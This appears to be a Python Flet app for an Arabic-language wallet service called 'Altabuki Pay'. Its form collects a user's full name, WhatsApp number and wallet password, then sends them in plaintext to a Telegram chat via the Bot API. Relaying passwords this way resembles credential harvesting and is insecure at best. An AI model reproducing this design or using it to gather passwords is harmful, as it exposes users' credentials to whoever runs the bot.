import flet as ft
import requests

# إعدادات بوت تيليجرام الخاص بك
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"

def main(page: ft.Page):
    page.title = "التبوكي باي - Altabuki Pay"
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.rtl = True
    page.theme_mode = ft.ThemeMode.LIGHT

    # حقول الإدخال
    name_field = ft.TextField(label="الاسم الرباعي", text_align=ft.TextAlign.RIGHT)
    whatsapp_field = ft.TextField(label="رقم الواتساب", keyboard_type=ft.KeyboardType.PHONE, text_align=ft.TextAlign.RIGHT)
    password_field = ft.TextField(label="كلمة المرور للمحفظة", password=True, can_reveal_password=True, text_align=ft.TextAlign.RIGHT)
    
    status_text = ft.Text(value="", color=ft.colors.RED)

    def send_to_telegram(e):
        if not name_field.value or not whatsapp_field.value or not password_field.value:
            status_text.value = "الرجاء تعبئة كافة الحقول المطلوبة!"
            page.update()
            return

        status_text.value = "جاري إرسال الطلب للإدارة..."
        page.update()

        # تنسيق رسالة تيليجرام
        message = (
            f"📥 **طلب إنشاء محفظة جديد (التبوكي باي)**\n\n"
            f"👤 **الاسم:** {name_field.value}\n"
            f"📱 **الواتساب:** {whatsapp_field.value}\n"
            f"🔑 **كلمة المرور:** {password_field.value}"
        )

        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "Markdown"
            }
            response = requests.post(url, json=payload)
            
            if response.status_code == 200:
                status_text.value = "✔ تم إرسال طلبك بنجاح إلى الإدارة!"
                status_text.color = ft.colors.GREEN
                name_field.value = ""
                whatsapp_field.value = ""
                password_field.value = ""
            else:
                status_text.value = "فشل في الإرسال، تحقق من الاتصال بالإنترنت."
                status_text.color = ft.colors.RED
        except Exception as ex:
            status_text.value = f"خطأ بالاتصال: {str(ex)}"
            status_text.color = ft.colors.RED
        
        page.update()

    # تصميم الواجهة داخل التطبيق
    page.add(
        ft.Container(
            content=ft.Column([
                ft.Text("💳 التبوكي باي (Altabuki Pay)", size=18, weight=ft.FontWeight.BOLD, color=ft.colors.INDIGO),
                ft.Divider(),
                name_field,
                whatsapp_field,
                password_field,
                ft.ElevatedButton("إرسال طلب إنشاء المحفظة", on_click=send_to_telegram, color=ft.colors.WHITE, bgcolor=ft.colors.GREEN),
                status_text
            ], alignment=ft.MainAxisAlignment.CENTER, horizontal_alignment=ft.CrossAxisAlignment.CENTER),
            padding=20,
            bgcolor=ft.colors.WHITE,
            border_radius=20,
            width=380,
            shadow=ft.BoxShadow(spread_radius=1, blur_radius=15, color=ft.colors.BLACK12)
        )
    )

if __name__ == "__main__":
    ft.app(target=main)
